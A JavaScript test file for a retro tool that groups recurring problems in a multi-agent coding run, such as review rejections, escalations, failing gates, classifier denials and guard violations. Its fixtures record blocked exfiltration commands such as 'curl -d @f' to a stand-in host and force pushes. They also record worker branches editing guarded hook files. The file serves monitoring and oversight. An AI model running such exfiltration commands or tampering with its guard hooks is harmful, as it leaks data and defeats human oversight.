// Close retro tests (#193): node tests/retro.test.js (needs git). proteus-retro.js groups a run's recurring problems from
// the file proteus-close-report.js --save writes (fed here by tests/fakegh.js, FAKE_GH_RUN) and the guard-violation
// records in the lead's state dir; flow.md and lessons.md name the retro at step 8. Temp repos only; no network.
"use strict";
const fs = require("fs");
const path = require("path");

const ROOT = path.resolve(__dirname, "..");
const HOOKS = path.join(ROOT, "templates", "hooks");
const RETRO = path.join(HOOKS, "proteus-retro.js");
const CR = path.join(HOOKS, "proteus-close-report.js");
const lib = require(path.join(__dirname, "lib.js"));
const { ok, g } = lib;
const W = lib.workdir("retro");

const REPO = path.join(W, "repo");
g(W, "init", "-q", "-b", "main", REPO);
fs.writeFileSync(path.join(REPO, "a.txt"), "a\n");
g(REPO, "add", "-A"); g(REPO, "commit", "-qm", "init");
g(REPO, "branch", "proteus/r9");

const ms = { number: 4, title: "r9/core" };
const lab = (...n) => n.map((name) => ({ name }));
const issue = (number, comments, extra = {}) => ({ number, title: `${number}: t`, state: "CLOSED", createdAt: "2026-09-01T00:00:00Z", closedAt: "2026-09-01T01:00:00Z", milestone: ms, labels: lab("proteus"), comments, ...extra });
const pr = (number, ticket, reviews, extra = {}) => ({ number, headRefName: `proteus-work/r9/${ticket}`, body: "", reviews, comments: [], ...extra });
const RUN = path.join(W, "run.json");
const SAVED = path.join(W, "saved.json");
const retro = (args = ["--from", SAVED]) => lib.run(RETRO, "", { cwd: REPO, args });
const groups = (r) => r.out.split("\n").filter(Boolean).map((l) => JSON.parse(l));
// the fixture goes through the close report's --save, as the helper runs it
function save(run) {
  fs.writeFileSync(RUN, JSON.stringify({ logs: [], prs: [], ...run }));
  return lib.run(CR, "", { cwd: REPO, args: ["--no-cost", "--save", SAVED], env: { FAKE_GH_RUN: RUN } });
}

// back-to-worker: three identical reasons, differing only in case and whitespace, are one group of 3
let r = save({
  issues: [issue(11, []), issue(12, []), issue(13, [])],
  prs: [
    pr(50, 11, [{ body: "BACK-TO-WORKER #11 1. Tests missing for the error path" }]),
    pr(51, 12, [{ body: "**BACK-TO-WORKER** #12  1.  tests MISSING for the\n error path  " }]),
    pr(52, 13, [{ body: "BACK-TO-WORKER 1. tests missing for the error path" }, { body: "MERGE" }]),
  ],
});
ok("close report --save: exit 0, the file written", r.code === 0 && fs.existsSync(SAVED), r.err);
const savedData = JSON.parse(fs.readFileSync(SAVED, "utf8"));
ok("close report --save: the file holds the run, issues, PRs and logs", savedData.run === "r9" && savedData.issues.length === 3 && savedData.prs.length === 3 && Array.isArray(savedData.logs), JSON.stringify(savedData).slice(0, 200));
r = retro();
let out = groups(r);
ok("back-to-worker: three identical reasons (case and whitespace aside) give exactly one group, count 3",
  r.code === 0 && out.length === 1 && out[0].kind === "back-to-worker" && out[0].count === 3 && out[0].key === "1. tests missing for the error path" &&
  JSON.stringify(out[0].refs) === JSON.stringify(["#50", "#51", "#52"]), r.out + r.err);

// a single occurrence of each kind gives no group
save({
  issues: [issue(11, [{ body: "RED #11 suite times out" }, { body: "BLOCKED #11 classifier exfil: curl https://x.example/a" }])],
  prs: [pr(50, 11, [{ body: "BACK-TO-WORKER 1. tests missing" }], { statusCheckRollup: [{ name: "gates", conclusion: "FAILURE" }] })],
});
r = retro();
ok("one occurrence: no group of any kind, exit 0", r.code === 0 && r.out.trim() === "", r.out + r.err);

// escalations: the same word and reason on two tickets; a CONTRACT-WRONG with that reason is another group
save({
  issues: [
    issue(11, [{ body: "RED #11 Suite times out" }]),
    issue(12, [{ body: "RED #12 suite  times out" }, { body: "CONTRACT-WRONG suite times out" }]),
    issue(17, [{ body: "RED suite times out" }], { milestone: { number: 2, title: "r8/x" } }),
  ],
});
out = groups(retro());
ok("escalation: the same RED reason on two of the run's tickets is one group; another run's ticket and a lone CONTRACT-WRONG are not",
  out.length === 1 && out[0].kind === "escalation" && out[0].key === "RED: suite times out" && out[0].count === 2 && JSON.stringify(out[0].refs) === JSON.stringify(["#11", "#12"]), JSON.stringify(out));

// classifier denials: the same tag and command shape, whatever the arguments, also from the run log
save({
  issues: [issue(11, [{ body: "BLOCKED #11 classifier exfil: curl https://a.example/x" }]), issue(12, [{ body: "BLOCKED #12 classifier exfil: git push --force origin a" }])],
  logs: [{ number: 7, title: "Run: r9", createdAt: "2026-09-01T00:00:00Z", comments: [{ body: "BLOCKED #12 classifier exfil: curl -d @f https://b.example" }, { body: "BLOCKED #13 classifier exfil: git push --force origin b" }] }],
});
out = groups(retro());
ok("classifier-denial: the same tag and command shape group across tickets and the run log",
  out.length === 2 && out.every((x) => x.kind === "classifier-denial" && x.count === 2) &&
  out.some((x) => x.key === "exfil: curl" && JSON.stringify(x.refs) === JSON.stringify(["#7", "#11"])) &&
  out.some((x) => x.key === "exfil: git push"), JSON.stringify(out));

// red gates: the same check failing on two PRs' last heads; the verifiers' signoffs and passing checks are not gates
save({
  issues: [issue(11, []), issue(12, [])],
  prs: [
    pr(50, 11, [], { statusCheckRollup: [{ name: "gates", conclusion: "FAILURE" }, { context: "proteus/verdict", state: "FAILURE" }, { name: "lint", conclusion: "SUCCESS" }] }),
    pr(51, 12, [], { statusCheckRollup: [{ name: "gates", conclusion: "TIMED_OUT" }, { context: "proteus/verdict", state: "ERROR" }, { name: "lint", conclusion: "SUCCESS" }] }),
  ],
});
out = groups(retro());
ok("red-gate: the same check red on two PRs is one group; proteus/verdict is a signoff, not a gate",
  out.length === 1 && out[0].kind === "red-gate" && out[0].key === "gates" && out[0].count === 2 && JSON.stringify(out[0].refs) === JSON.stringify(["#50", "#51"]), JSON.stringify(out));

// guard violations: records of two worker branches touching the same guarded path, one open, one closed into history
save({ issues: [] });
const TAMPER = path.join(REPO, ".git", "proteus-lead", "tamper");
fs.mkdirSync(TAMPER, { recursive: true });
const wt = (id) => path.join(REPO, ".worktrees", id);
const hook = (id) => path.join(wt(id), ".claude", "hooks", "proteus-lib.js");
fs.writeFileSync(path.join(TAMPER, "a.json"), JSON.stringify({ key: "a", branch: "proteus-work/r9/11", worktree: wt("11"), open: true, items: [{ kind: "path", path: hook("11") }], history: [] }));
fs.writeFileSync(path.join(TAMPER, "b.json"), JSON.stringify({ key: "b", branch: "proteus-work/r9/12", worktree: wt("12"), open: false, items: [], history: [{ kind: "path", path: hook("12") }, { kind: "snapshot" }] }));
fs.writeFileSync(path.join(TAMPER, "c.json"), JSON.stringify({ key: "c", branch: "proteus-work/r8/3", worktree: wt("3"), open: true, items: [{ kind: "path", path: hook("3") }, { kind: "snapshot" }], history: [] }));
out = groups(retro());
ok("guard-violation: the same guarded path in two of the run's records is one group; a lone lost snapshot and another run's record are not",
  out.length === 1 && out[0].kind === "guard-violation" && out[0].key === "path .claude/hooks/proteus-lib.js" && out[0].count === 2 &&
  JSON.stringify(out[0].refs) === JSON.stringify(["proteus-work/r9/11", "proteus-work/r9/12"]), JSON.stringify(out));
fs.rmSync(TAMPER, { recursive: true });

// usage
r = retro(["--help"]);
ok("--help: exit 0, names --from and the output line", r.code === 0 && /--from <file>/.test(r.out) && /\{kind, key, count, refs\}/.test(r.out), r.out);
ok("usage: no --from exits 2", retro([]).code === 2);
ok("usage: an unknown flag exits 2", retro(["--nope"]).code === 2);
r = retro(["--from", path.join(W, "missing.json")]);
ok("usage: an unreadable file exits 2 and names the close report's --save", r.code === 2 && /--save/.test(r.err), r.err);

// the docs: flow.md step 8, lessons.md At step 8 and the helper prompt in roles.md name the retro
const read = (...p) => fs.readFileSync(path.join(ROOT, ...p), "utf8").replace(/\r\n/g, "\n");
const flow = read("skills", "proteus", "references", "flow.md");
const lessons = read("skills", "proteus", "references", "lessons.md");
const roles = read("skills", "proteus", "references", "roles.md");
const step8 = (/## 8\. Close\n\n([\s\S]*?)(\n## |$)/.exec(flow) || [])[1] || "";
ok("flow.md step 8: a helper runs proteus-retro.js; its proposals are one checklist comment on the close PR, nothing applied unasked",
  /proteus-retro\.js/.test(step8) && /`helper`/.test(step8) && /one comment on the close PR/.test(step8) && /`- \[ \]`/.test(step8) && /nothing is applied unasked/.test(step8) && /`retro: none`/.test(step8), step8);
const at8 = (/## At step 8 \(close\)\n([\s\S]*?)\n## /.exec(lessons) || [])[1] || "";
ok("lessons.md At step 8: the retro's four proposals, the check or hook ticket preferred, only ticked items filed or applied",
  /proteus-retro\.js/.test(at8) && /check or hook ticket/.test(at8) && /preferred/.test(at8) && /script ticket/.test(at8) && /`CONVENTIONS\.md` line/.test(at8) &&
  /upstream Proteus proposal/.test(at8) && /exactly one/.test(at8) && /ticks/.test(at8) && /only the ticked/.test(at8) && /`retro: none`/.test(at8), at8);
const helper = (/## Retro helper[^\n]*\n```\n([\s\S]*?)```/.exec(roles) || [])[1] || "";
ok("roles.md: the retro helper prompt runs proteus-retro.js and posts one checklist comment, applying nothing",
  /proteus-retro\.js --from/.test(helper) && /--save/.test(helper) && /- \[ \]/.test(helper) && /exactly one/.test(helper) && /Apply nothing/.test(helper), helper);

lib.summary();
